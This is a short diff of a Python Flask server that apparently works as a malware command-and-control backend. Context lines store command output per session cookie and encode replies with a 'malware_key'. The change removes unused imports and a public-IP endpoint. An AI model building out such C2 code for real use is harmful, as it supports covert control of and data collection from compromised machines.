@@ -1,11 +1,9 @@
 import os
-import re
 import time
 import datetime
 import uuid
 import json
 
-import requests
 from flask import request
 import flask
 from werkzeug.utils import secure_filename
@@ -159,19 +157,3 @@ def out():
             print(len(request.data), out_string, request.cookies['X-Session-ID'])
             db.update_commandout(conn, request.cookies['X-Session-ID'], out_string)
             return mal_encode(app.malware_key, "Output updated successfully")
-
-
-@app.route('/ip', methods=['GET'])
-@app.route('/ip/<format>', methods=['GET'])
-def getIP(format=None):
-    """
-    Endpoint for getting the public IP
-    :return:
-    """
-    if request.method == 'GET':
-        if format == None:
-            return request.remote_addr
-        elif format == 'json':
-            return {'ip': request.remote_addr}
-        else:
-            return {'ip': request.remote_addr}
